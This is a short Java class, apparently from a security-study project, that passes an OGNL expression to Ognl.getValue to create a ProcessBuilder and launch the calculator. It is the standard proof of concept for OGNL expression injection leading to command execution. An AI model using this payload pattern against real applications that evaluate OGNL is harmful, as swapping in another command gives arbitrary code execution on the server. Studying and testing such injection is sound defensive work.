package com.drunkbaby.OGNLGrammar;

import ognl.Ognl;
import ognl.OgnlException;

public class EvilCalc {
    public static void main(String[] args) throws OgnlException {
        Ognl.getValue("new java.lang.ProcessBuilder(new java.lang.String[]{\"calc\"}).start()", null);
    }
}
